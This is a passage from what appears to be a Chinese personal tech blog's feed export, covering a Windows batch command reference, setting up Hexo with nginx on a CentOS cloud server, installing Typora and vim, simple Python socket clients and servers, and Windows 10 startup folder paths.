默认值为0，一般命令执行出错会设 errorlevel 为1

3 dir
显示文件夹内容
dir #显示当前目录中的文件和子目录
dir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件
dir c: /a:d #显示 C 盘当前目录中的目录
dir c: /a:-d #显示 C 盘根目录中的文件
dir c: /b/p #/b只显示文件名，/p分页显示
dir *.exe /s #显示当前目录和子目录里所有的.exe文件

4 cd
切换目录
cd #进入根目录
cd #显示当前目录
cd /d d:sdk #可以同时更改盘符和目录

5 md
创建目录
md d:abc #如果 d:a 不存在，将会自动创建中级目录
#如果命令扩展名被停用，则需要键入 mkdir abc

6 rd
删除目录
rd abc #删除当前目录里的 abc 子目录，要求为空目录
rd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式

7 del
删除文件
del d:test.txt #删除指定文件，不能是隐藏、系统、只读文件
del /q/a/f d:temp*.*
删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录
del /q/a/f/s d:temp*.*
删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录

8 ren
重命名命令
ren d:temp tmp #支持对文件夹的重命名

9 cls
清屏
10 type
显示文件内容
type c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码
type *.txt #显示当前目录里所有.txt文件的内容

</code></pre><h3 id="命令11-20"><a href="#命令11-20" class="headerlink" title="命令11~20"></a>命令11~20</h3><pre><code>11 copy
拷贝文件
copy c:test.txt d:test.bak
复制 c:test.txt 文件到 d: ，并重命名为 test.bak
copy con test.txt
从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件
con代表屏幕，prn代表打印机，nul代表空设备
copy 1.txt + 2.txt 3.txt
合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件
如果不指定 3.txt ，则保存到 1.txt
copy test.txt +
复制文件到自己，实际上是修改了文件日期

12 title
设置cmd窗口的标题
title 新标题 #可以看到cmd窗口的标题栏变了

13 ver
显示系统版本

14 label 和 vol
设置卷标
vol #显示卷标
label #显示卷标，同时提示输入新卷标
label c:system #设置C盘的卷标为 system

15 pause
暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束

16 rem 和 ::
注释命令
注释行不执行操作

17 date 和 time
日期和时间
date #显示当前日期，并提示输入新日期，按&quot;回车&quot;略过输入
date/t #只显示当前日期，不提示输入新日期
time #显示当前时间，并提示输入新时间，按&quot;回车&quot;略过输入
time/t #只显示当前时间，不提示输入新时间

18 goto 和 :
跳转命令
:label #行首为:表示该行是标签行，标签行不执行操作
goto label #跳转到指定的标签那一行

19 find (外部命令)
查找命令
find &quot;abc&quot; c:test.txt
在 c:test.txt 文件里查找含 abc 字符串的行
如果找不到，将设 errorlevel 返回码为1
find /i “abc” c:test.txt
查找含 abc 的行，忽略大小写
find /c &quot;abc&quot; c:test.txt
显示含 abc 的行的行数

20 more (外部命令)
逐屏显示
more c:test.txt #逐屏显示 c:test.txt 的文件内容</code></pre><h3 id="命令21-30"><a href="#命令21-30" class="headerlink" title="命令21~30"></a>命令21~30</h3><pre><code>21 tree
显示目录结构
tree d: #显示D盘的文件目录结构

22 &amp;
顺序执行多条命令，而不管命令是否执行成功

23 &amp;&amp;
顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令
find &quot;ok&quot; c:test.txt &amp;&amp; echo 成功
如果找到了&quot;ok&quot;字样，就显示&quot;成功&quot;，找不到就不显示

24 ||
顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令
find &quot;ok&quot; c:test.txt || echo 不成功
如果找不到&quot;ok&quot;字样，就显示&quot;不成功&quot;，找到了就不显示

25 |
管道命令
dir *.* /s/a | find /c &quot;.exe&quot;
管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令
该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数
type c:test.txt|more
这个和 more c:test.txt 的效果是一样的

26 &gt; 和 &gt;&gt;
输出重定向命令
&gt; 清除文件中原有的内容后再写入
&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容
主要将本来显示在屏幕上的内容输出到指定文件中
指定文件如果不存在，则自动生成该文件
type c:test.txt &gt;prn
屏幕上不显示文件内容，转向输出到打印机
echo hello world&gt;con
在屏幕上显示hello world，实际上所有输出都是默认 &gt;con 的
copy c:test.txt f: &gt;nul
拷贝文件，并且不显示&quot;文件复制成功&quot;的提示信息，但如果f盘不存在，还是会显示出错信息
copy c:test.txt f: &gt;nul 2&gt;nul
不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息
echo ^^W ^&gt; ^W&gt;c:test.txt
生成的文件内容为 ^W &gt; W
^ 和 &gt; 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号

27 &lt;
从文件中获得输入信息，而不是从屏幕上
一般用于 date time label 等需要等待输入的命令
@echo off
echo 2005-05-01&gt;temp.txt
date &lt;temp.txt
del temp.txt
这样就可以不等待输入直接修改当前日期

28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*
命令行传递给批处理的参数  //上一个命令的结果作为参数
%0 批处理文件本身
%1 第一个参数
%9 第九个参数
%* 从第一个参数开始的所有参数
批参数(%n)的替代已被增强。您可以使用以下语法:
%~1 - 删除引号(&quot; )， 扩充 %1
%~f1 - 将 %1 扩充到一个完全合格的路径名
%~d1 - 仅将 %1 扩充到一个驱动器号
%~p1 - 仅将 %1 扩充到一个路径
%~n1 - 仅将 %1 扩充到一个文件名
%~x1 - 仅将 %1 扩充到一个文件扩展名
%~s1 - 扩充的路径指含有短名
%~a1 - 将 %1 扩充到文件属性
%~t1 - 将 %1 扩充到文件的日期/时间
%~z1 - 将 %1 扩充到文件的大小
%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1
扩充到找到的第一个完全合格的名称。如果环境
变量名未被定义，或者没有找到文件，此组合键会
扩充到空字符串
可以组合修定符来取得多重结果:
%~dp1 - 只将 %1 扩展到驱动器号和路径
%~nx1 - 只将 %1 扩展到文件名和扩展名
%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，
并扩展到找到的第一个文件的驱动器号和路径。
%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。
可以参照 call/? 或 for/? 看出每个参数的含意
echo load &quot;%%1&quot; &quot;%%2&quot;&gt;c:test.txt
生成的文件内容为 load &quot;%1&quot;  &quot;%2&quot;
批处理文件里，用这个格式把命令行参数输出到文件

29 if
判断命令
if &quot;%1&quot;==&quot;/a&quot; echo 第一个参数是/a
if /i &quot;%1&quot; equ &quot;/a&quot; echo 第一个参数是/a
/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?
if exist c:test.bat echo 存在c:test.bat文件
if not exist c:windows (
echo 不存在c:windows文件夹
)
if exist c:test.bat (
echo 存在c:test.bat
) else (
echo 不存在c:test.bat
)
30 setlocal 和 endlocal
设置”命令扩展名”和”延缓环境变量扩充”
SETLOCAL ENABLEEXTENSIONS #启用&quot;命令扩展名&quot;
SETLOCAL DISABLEEXTENSIONS #停用&quot;命令扩展名&quot;
SETLOCAL ENABLEDELAYEDEXPANSION #启用&quot;延缓环境变量扩充&quot;
SETLOCAL DISABLEDELAYEDEXPANSION #停用&quot;延缓环境变量扩充&quot;
ENDLOCAL #恢复到使用SETLOCAL语句以前的状态
“命令扩展名”默认为启用
“延缓环境变量扩充”默认为停用
批处理结束系统会自动恢复默认值
可以修改注册表以禁用&quot;命令扩展名&quot;，详见 cmd /? 。所以用到&quot;命令扩展名&quot;的程
序，建议在开头和结尾加上 SETLOCAL ENABLEEXTENSIONS 和 ENDLOCAL 语句，以确
保程序能在其它系统上正确运行
&quot;延缓环境变量扩充&quot;主要用于 if 和 for 的符合语句，在 set 的说明里有其实用例程</code></pre><h3 id="命令31-39"><a href="#命令31-39" class="headerlink" title="命令31~39"></a>命令31~39</h3><pre><code>31 set
设置变量
引用变量可在变量名前后加 % ，即 %变量名%
set #显示目前所有可用的变量，包括系统变量和自定义的变量
echo %SystemDrive% #显示系统盘盘符。系统变量可以直接引用
set p #显示所有以p开头的变量，要是一个也没有就设errorlevel=1
set p=aa1bb1aa2bb2 #设置变量p，并赋值为 = 后面的字符串，即aa1bb1aa2bb2
echo %p% #显示变量p代表的字符串，即aa1bb1aa2bb2
echo %p:~6% #显示变量p中第6个字符以后的所有字符，即aa2bb2
echo %p:~6,3% #显示第6个字符以后的3个字符，即aa2
echo %p:~0,3% #显示前3个字符，即aa1
echo %p:~-2% #显示最后面的2个字符，即b2
echo %p:~0,-2% #显示除了最后2个字符以外的其它字符，即aa1bb1aa2b
echo %p:aa=c% #用c替换变量p中所有的aa，即显示c1bb1c2bb2
echo %p:aa=% #将变量p中的所有aa字符串置换为空，即显示1bb12bb2
echo %p:*bb=c% #第一个bb及其之前的所有字符被替换为c，即显示c1aa2bb2
set p=%p:*bb=c% #设置变量p，赋值为 %p:*bb=c% ，即c1aa2bb2
set /a p=39 #设置p为数值型变量，值为39
set /a p=39/10 #支持运算符，有小数时用去尾法，39/10=3.9，去尾得3，p=3
set /a p=p/10 #用 /a 参数时，在 = 后面的变量可以不加%直接引用
set /a p=”1&amp;0″ #”与”运算，要加引号。其它支持的运算符参见set/?
set p= #取消p变量
set /p p=请输入
屏幕上显示”请输入”，并会将输入的字符串赋值给变量p
注意这条可以用来取代 choice 命令
注意变量在 if 和 for 的复合语句里是一次性全部替换的，如
@echo off
set p=aaa
if %p%==aaa (
echo %p%
set p=bbb
echo %p%
)
结果将显示
aaa
aaa
因为在读取 if 语句时已经将所有 %p% 替换为aaa
这里的&quot;替换&quot;，在 /? 帮助里就是指&quot;扩充&quot;、&quot;环境变量扩充&quot;
可以启用”延缓环境变量扩充”，用 ! 来引用变量，即 !变量名!
@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
set p=aaa
if %p%==aaa (
echo %p%
set p=bbb
echo !p!
)
ENDLOCAL
结果将显示
aaa
bbb
还有几个动态变量，运行 set 看不到
%CD% #代表当前目录的字符串
%DATE% #当前日期
%TIME% #当前时间
%RANDOM% #随机整数，介于0~32767
%ERRORLEVEL% #当前 ERRORLEVEL 值
%CMDEXTVERSION% #当前命令处理器扩展名版本号
%CMDCMDLINE% #调用命令处理器的原始命令行
可以用echo命令查看每个变量值，如 echo %time%
注意 %time% 精确到毫秒，在批处理需要延时处理时可以用到

32 start
批处理中调用外部程序的命令，否则等外部程序完成后才继续执行剩下的指令

33 call
批处理中调用另外一个批处理的命令，否则剩下的批处理指令将不会被执行
有时有的应用程序用start调用出错的，也可以call调用

34 choice (外部命令)
选择命令
让用户输入一个字符，从而选择运行不同的命令，返回码errorlevel为1234……
win98里是choice.com
win2000pro里没有，可以从win98里拷过来
win2003里是choice.exe
choice /N /C y /T 5 /D y&gt;nul
延时5秒

35 assoc 和 ftype
文件关联
assoc 设置&#39;文件扩展名&#39;关联，关联到&#39;文件类型&#39;
ftype 设置&#39;文件类型&#39;关联，关联到&#39;执行程序和参数&#39;
当你双击一个.txt文件时，windows并不是根据.txt直接判断用 notepad.exe 打开
而是先判断.txt属于 txtfile &#39;文件类型&#39;
再调用 txtfile 关联的命令行 txtfile=%SystemRoot%system32NOTEPAD.EXE %1
可以在&quot;文件夹选项&quot;→&quot;文件类型&quot;里修改这2种关联
assoc #显示所有&#39;文件扩展名&#39;关联
assoc .txt #显示.txt代表的&#39;文件类型&#39;，结果显示 .txt=txtfile
assoc .doc #显示.doc代表的&#39;文件类型&#39;，结果显示 .doc=Word.Document.8
assoc .exe #显示.exe代表的&#39;文件类型&#39;，结果显示 .exe=exefile
ftype #显示所有&#39;文件类型&#39;关联
ftype exefile #显示exefile类型关联的命令行，结果显示 exefile=&quot;%1&quot; %*
assoc .txt=Word.Document.8
设置.txt为word类型的文档，可以看到.txt文件的图标都变了
assoc .txt=txtfile
恢复.txt的正确关联
ftype exefile=&quot;%1&quot; %*
恢复 exefile 的正确关联
如果该关联已经被破坏，可以运行 command.com ，再输入这条命令

36 pushd 和 popd
切换当前目录
@echo off
c: &amp; cd &amp; md mp3 #在 C: 建立 mp3 文件夹
md d:mp4 #在 D: 建立 mp4 文件夹
cd /d d:mp4 #更改当前目录为 d:mp4
pushd c:mp3 #保存当前目录，并切换当前目录为 c:mp3
popd #恢复当前目录为刚才保存的 d:mp4

37 for
循环命令
这个比较复杂，请对照 for/? 来看
for %%i in (c: d: e: f:) do echo %%i
依次调用小括号里的每个字符串，执行 do 后面的命令
注意%%i，在批处理中 for 语句调用参数用2个%
默认的字符串分隔符是&quot;空格键&quot;，&quot;Tab键&quot;，&quot;回车键&quot;
for %%i in (*.txt) do find &quot;abc&quot; %%i
对当前目录里所有的txt文件执行 find 命令
for /r . %%i in (*.txt) do find &quot;abc&quot; %%i
在当前目录和子目录里所有的.txt文件中搜索包含 abc 字符串的行
for /r . %%i in (.) do echo %%~pni
显示当前目录名和所有子目录名，包括路径，不包括盘符
for /r d:mp3 %%i in (*.mp3) do echo %%i&gt;&gt;d:mp3.txt
把 d:mp3 及其子目录里的mp3文件的文件名都存到 d:mp3.txt 里去
for /l %%i in (2,1,8) do echo %%i
生成2345678的一串数字，2是数字序列的开头，8是结尾，1表示每次加1
for /f %%i in (&#39;set&#39;) do echo %%i
对 set 命令的输出结果循环调用，每行一个
for /f &quot;eol=P&quot; %%i in (&#39;set&#39;) do echo %%i
取 set 命令的输出结果，忽略以 P 开头的那几行
for /f %%i in (d:mp3.txt) do echo %%i
显示 d:mp3.txt 里的每个文件名，每行一个，不支持带空格的名称
for /f &quot;delims=&quot; %%i in (d:mp3.txt) do echo %%i
显示 d:mp3.txt 里的每个文件名，每行一个，支持带空格的名称
for /f &quot;skip=5 tokens=4&quot; %%a in (&#39;dir&#39;) do echo %%a
对 dir 命令的结果，跳过前面5行，余下的每行取第4列
每列之间的分隔符为默认的&quot;空格&quot;
可以注意到 dir 命令输出的前5行是没有文件名的
for /f &quot;tokens=1,2,3 delims=- &quot; %%a in (&#39;date /t&#39;) do (
echo %%a
echo %%b
echo %%c
)
对 date /t 的输出结果，每行取1、2、3列
第一列对应指定的 %%a ，后面的 %%b 和 %%c 是派生出来的，对应其它列
分隔符指定为 - 和&quot;空格&quot;，注意 delims=- 后面有个&quot;空格&quot;
其中 tokens=1,2,3 若用 tokens=1-3 替换，效果是一样的
for /f &quot;tokens=2* delims=- &quot; %%a in (&#39;date /t&#39;) do echo %%b
取第2列给 %%a ，其后的列都给 %%b

38 subst (外部命令)
映射磁盘。
subst z: serverd #这样输入z:就可以访问serverd了
subst z: /d #取消该映射
subst #显示目前所有的映时

39 xcopy (外部命令)
文件拷贝
xcopy d:mp3 e:mp3 /s/e/i/y
复制 d:mp3 文件夹、所有子文件夹和文件到 e: ，覆盖已有文件
加 /i 表示如果 e: 没有 mp3 文件夹就自动新建一个，否则会有询问</code></pre>]]></content>
  </entry>
  <entry>
    <title>hexo+腾讯云</title>
    <url>/2020/01/19/hexo+%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B8%BB%E6%9C%BA%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="hexo＋腾讯云主机搭建博客"><a href="#hexo＋腾讯云主机搭建博客" class="headerlink" title="hexo＋腾讯云主机搭建博客"></a>hexo＋腾讯云主机搭建博客</h2><ul>
<li><a href="https://zhuanlan.zhihu.com/p/120322118">参考链接1</a></li>
<li><a href="https://www.jianshu.com/p/31eb5c754c01">参考链接2</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/60578464">参考链接3</a></li>
</ul>
<ul>
<li>说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）</li>
</ul>
<span id="more"></span>

<h3 id="一．Git安装"><a href="#一．Git安装" class="headerlink" title="一．Git安装"></a>一．Git安装</h3><ul>
<li>我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧</li>
<li>先检查是否有git</li>
</ul>
<pre><code>git --version</code></pre><ul>
<li>没有则安装，旧的卸载重装</li>
</ul>
<pre><code>＃卸载旧的git
yum remove git
# 安装依赖库
yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel
# 将git下载安装到/usr/local/src目录
cd /usr/local/src
wget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz
tar -zvxf git-2.26.0.tar.gz
# 进入目录
cd git-2.26.0
# 编译执行
make prefix=/usr/local/git all
# 安装 git 到 /usr/local/git 目录下
make prefix=/usr/local/git install
</code></pre><h3 id="二、配置Git环境变量"><a href="#二、配置Git环境变量" class="headerlink" title="二、配置Git环境变量"></a>二、配置Git环境变量</h3><ul>
<li>打开环境变量配置文件进行配置</li>
</ul>
<pre><code>vim /etc/profile

#添加以下内容
PATH=$PATH:/usr/local/git/bin   # git 的目录
export PATH

# 使配置的环境变量生效
source /etc/profile</code></pre><ul>
<li>验证git安装成功</li>
</ul>
<pre><code>git --version</code></pre><h3 id="三、云主机与GitHub交换SSH密匙"><a href="#三、云主机与GitHub交换SSH密匙" class="headerlink" title="三、云主机与GitHub交换SSH密匙"></a>三、云主机与GitHub交换SSH密匙</h3><ul>
<li>Git初始化</li>
</ul>
<pre><code># 设置github昵称
git config --global user.name &#39;mxrmiss&#39;
# 设置github邮箱
git config --global user.email &#39;heroli520@outlook.com&#39;</code></pre><ul>
<li>git status 无法显示中文</li>
</ul>
<pre><code>git config --global core.quotepath false</code></pre><ul>
<li>创建ssh密匙</li>
</ul>
<pre><code>ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</code></pre><ul>
<li>输出 id_rsa.pub 内容并复制到GitHub中的setting页面上</li>
</ul>
<pre><code>cat id_rsa.pub</code></pre><p><a href="https://imgchr.com/i/syONLT"><img "" class="lazyload placeholder" data-original="https://s3.ax1x.com/2021/01/18/syONLT.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="syONLT.jpg"></a></p>
<ul>
<li>ssh -T <a href="mailto:git@github.com">git@github.com</a> 输入此命令，显示successful表示成功</li>
</ul>
<h3 id="四、node-js安装"><a href="#四、node-js安装" class="headerlink" title="四、node.js安装"></a>四、node.js安装</h3><ol>
<li>node.js下载</li>
</ol>
<pre><code>cd /opt
wget https://npm.taobao.org/mirrors/node/v10.16.0/node-v10.16.0-linux-x64.tar.xz  # 下载二进制安装包</code></pre><ol start="2">
<li>node.js部署</li>
</ol>
<pre><code>cd /opt
tar xf node-v10.16.0-linux-x64.tar.xz 
ln -s node-v10.16.0-linux-x64 nodejs
nodejs -&gt; node-v10.16.0-linux-x64</code></pre><ol start="3">
<li>版本信息</li>
</ol>
<pre><code>cd /opt/nodejs/bin
./node -v
会看到 v10.16.0</code></pre><ol start="4">
<li>创建软连接</li>
</ol>
<pre><code>ln -s /opt/nodejs/bin/node /usr/local/bin/node
ln -s /opt/nodejs/bin/npm  /usr/local/bin/npm

# 验证
node -v</code></pre><h3 id="五、hexo-部署"><a href="#五、hexo-部署" class="headerlink" title="五、hexo 部署"></a>五、hexo 部署</h3><ol>
<li>安装hexo</li>
</ol>
<pre><code>npm install hexo-cli -g </code></pre><ol start="2">
<li>采用软连接的方式将hexo添加入全局变量</li>
</ol>
<pre><code>ln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</code></pre><ol start="3">
<li>将自己GitHub中存储的hexo博客ssh下载到主机中</li>
</ol>
<h3 id="六、使用Nginx部署Hexo站点"><a href="#六、使用Nginx部署Hexo站点" class="headerlink" title="六、使用Nginx部署Hexo站点"></a>六、使用Nginx部署Hexo站点</h3><ol>
<li>Nginx安装</li>
</ol>
<pre><code>yum install -y nginx</code></pre><ol start="2">
<li>配置Nginx</li>
</ol>
<pre><code>nginx -t</code></pre><ol start="3">
<li>使用vim打开nginx.conf文件</li>
</ol>
<ul>
<li>注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载</li>
</ul>
<pre><code>vim /etc/nginx/nginx.conf</code></pre><p><a href="https://imgchr.com/i/s6S4k8"><img "" class="lazyload placeholder" data-original="https://s3.ax1x.com/2021/01/18/s6S4k8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="s6S4k8.png"></a></p>
<ol start="4">
<li>启动Nginx</li>
</ol>
<pre><code>systemctl start nginx.service</code></pre><ol start="5">
<li>重启Nginx</li>
</ol>
<pre><code>systemctl restart nginx.service</code></pre><h3 id="七、配置本地hexo"><a href="#七、配置本地hexo" class="headerlink" title="七、配置本地hexo"></a>七、配置本地hexo</h3><ul>
<li>博客根目录_config下增加</li>
</ul>
<pre><code>deploy:
    type: git  (必须是git)
    repo: root@***(服务器外网ip):#仓库地址
    branch: master   </code></pre><ul>
<li>进入自己的hexo博客目录</li>
<li>hexo clean</li>
<li>hexo g</li>
<li>hexo d</li>
<li>搜索自己的域名便可访问</li>
</ul>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/03/24/kali%20%E5%AE%89%E8%A3%85typora/</url>
    <content><![CDATA[<hr>
<hr>
<h2 id="kali-安装typora"><a href="#kali-安装typora" class="headerlink" title="kali 安装typora"></a>kali 安装typora</h2><h3 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h3><ul>
<li>官网下载文件解压，并移动到 /opt 文件夹下</li>
</ul>
<h3 id="二、赋权"><a href="#二、赋权" class="headerlink" title="二、赋权"></a>二、赋权</h3><ul>
<li>在typora目录的bin文件夹下执行命令</li>
</ul>
<pre><code>./typora</code></pre><ul>
<li><p>会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.</p>
</li>
<li><p>执行命令</p>
</li>
</ul>
<pre><code>sudo chown root chrome-sandbox
sudo chgrp root chrome-sandbox
sudo chmod 4755 chrome-sandbox</code></pre><h3 id="三、添加快捷方式"><a href="#三、添加快捷方式" class="headerlink" title="三、添加快捷方式"></a>三、添加快捷方式</h3><ul>
<li>vim typora.desktop</li>
</ul>
<pre><code>[Desktop Entry]
Name=Typora
Exec=/opt/Typora-linux-x64/Typora
Type=Application
Icon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png</code></pre><ul>
<li>将快捷方式复制到/usr/share/applications</li>
</ul>
<pre><code>sudo cp typora.desktop /usr/share/applications/</code></pre><ul>
<li>关机重启</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>网络编程</title>
    <url>/2020/10/16/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="python网络编程"><a href="#python网络编程" class="headerlink" title="python网络编程"></a>python网络编程</h1><h3 id="一、客户端"><a href="#一、客户端" class="headerlink" title="一、客户端"></a>一、客户端</h3><h4 id="TCP客户端"><a href="#TCP客户端" class="headerlink" title="TCP客户端"></a>TCP客户端</h4><span id="more"></span>

<pre><code class="python">import socket

# 建立变量：目标主机和目标端口
host = ***
port = ***

# 建立一个socket对象
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 连接客户端
# connect内的是一个元组，代表的是一个具体的地址
client.connect((host, port))

# 发送数据
client.send(&quot;hello, world!&quot;)

# 接受数据
# 最大接受1024字节数据
response = client.recv(1024)

print(response)

# 关闭套接字
client.close()</code></pre>
<h4 id="UDP客户端"><a href="#UDP客户端" class="headerlink" title="UDP客户端"></a>UDP客户端</h4><pre><code class="python">import socket

# 建立变量：目标主机和目标端口
host = ***
port = ***

# 建立一个socket对象
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 连接客户端
# connect内的是一个元组，代表的是一个具体的地址
client.connect((host, port))

# 发送数据
client.sendto(&quot;hello, world!&quot;, (host, port))

# 接收数据
# 最大接受1024字节数据
data, addr = client.recvfrom(1024)

print(data)

# 关闭套接字
client.close()</code></pre>
<h3 id="二、服务器"><a href="#二、服务器" class="headerlink" title="二、服务器"></a>二、服务器</h3><pre><code class="python">import socket
import threading


# bind_id留空的意思是本地IP 127.0.0.1
bind_id = &quot;&quot;  
bind_port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_id, bind_port))
server.listen(5)
print(&#39;[*] Listening on &#123;&#125;:&#123;&#125;&#39; .format(bind_id, bind_port))

def handle_client(client_socket):
    request = client_socket.recv(1024)
    print(&#39;[*] Received: &#123;&#125;&#39; .format(request))
    send_it = &quot;I love you&quot;
    client_socket.send(send_it.encode())
    client_socket.close()


client, address = server.accept()
print(&quot;[*] Accepted connection from: &#123;&#125;:&#123;&#125;&quot; .format(client, address))
client_handler_t1 = threading.Thread(target=handle_client, args=(client, ))
client_handler_t1.start()</code></pre>
<h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><h4 id="服务器（采取多线程）"><a href="#服务器（采取多线程）" class="headerlink" title="服务器（采取多线程）"></a>服务器（采取多线程）</h4><pre><code class="python">import socket
import threading
# from struct import pack


class ThreadSocket(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        # 超时收取，超过5秒没收到客户端回应自动断开连接
        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack(&#39;QQ&#39;, 5, 0))
        # 超时发送，超过5秒没将数据传送至客户端断开连接
        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack(&#39;QQ&#39;, 4, 0))

    def listen(self):
        self.sock.listen(5)
        &#39;&#39;&#39;
        在这里插入对Ctrl+C的控制
        &#39;&#39;&#39;
        # 循环连接，可以与多个客户端依次链接
        # while True:
        client, address = self.sock.accept()
        print(&#39;正在接收客户端信息...\n&#39;)
        # 超过30秒停止活动
        # client.settimeout(15)
        t1 = threading.Thread(target=self.handleClientRequest, args=(
            client, address))
        t1.start()

    def handleClientRequest(self, client, address):
        # 采取循环，使每次与客户端连接都可以进行多次对话
        while True:
            try:
                data = client.recv(1024)
                print(&#39;显示客户端信息：&#123;&#125;&#39;.format(data))
                if data:
                    client.send(data)
                else:
                    print(&quot;Client has disconnected&quot;)
                    break
            except:
                client.close()


if __name__ == &#39;__main__&#39;:
    server = ThreadSocket(&#39;&#39;, 9000)
    server.listen()
</code></pre>
<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre><code class="python">import socket

target_host = &#39;127.0.0.1&#39;
target_ip = 9000

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_ip))
send_data = input(&#39;输入你想说的：&#39;)
client.send(send_data.encode())
response = client.recv(4096)

print(response.decode() + &#39;love&#39;)</code></pre>
<h3 id="三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT"><a href="#三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT" class="headerlink" title="三、socket常见选项之SO_REUSEADDR,SO_REUSEPORT"></a>三、<a href="https://www.cnblogs.com/HKUI/p/11707170.html">socket常见选项之SO_REUSEADDR,SO_REUSEPORT</a></h3><ul>
<li>使端口被释放后可以立即被使用</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/03/24/win_10%20%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E6%96%87%E4%BB%B6%E5%A4%B9/</url>
    <content><![CDATA[<hr>
<hr>
<h2 id="所有用户的开机自启文件夹"><a href="#所有用户的开机自启文件夹" class="headerlink" title="所有用户的开机自启文件夹"></a>所有用户的开机自启文件夹</h2><ul>
<li>英文路径</li>
</ul>
<span id="more"></span>

<pre><code># ProgramData目录是隐藏的
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></pre><ul>
<li>中文路径</li>
</ul>
<pre><code>C:\ProgramData\Microsoft\Windows\「开始」菜单\程序\启动</code></pre><h2 id="指定用户的开机自启文件夹"><a href="#指定用户的开机自启文件夹" class="headerlink" title="指定用户的开机自启文件夹"></a>指定用户的开机自启文件夹</h2><ul>
<li>英文路径</li>
</ul>
<pre><code>C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><ul>
<li>中文路径</li>
</ul>
<pre><code>C:\用户\username\AppData\Roaming\Microsoft\Windows\「开始」菜单\程序\启动</code></pre><ul>
<li>打开隐藏文件夹的方法</li>
</ul>
<p><a href="https://imgchr.com/i/BFDqhV"><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/10/22/BFDqhV.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="BFDqhV.png"></a></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/03/24/windows10%E5%AE%89%E8%A3%85vim/</url>
    <content><![CDATA[<h1 id="windows10安装vim"><a href="#windows10安装vim" class="headerlink" title="windows10安装vim"></a>windows10安装vim</h1><p>[点击链接](<a href="https://github.com/vim/vim-win32-installer/releases">Releases · vim/vim-win32-installer · GitHub</a>)</p>
<ul>
<li>注意：一些杀毒软件可能会阻止安装该软件，允许即可</li>
<li>进入win10命令行，输入vim即可进入界面</li>
<li>默认安装在C:\Program Files\Vim</li>
</ul>
]]></content>
  </entry>
  <entry>
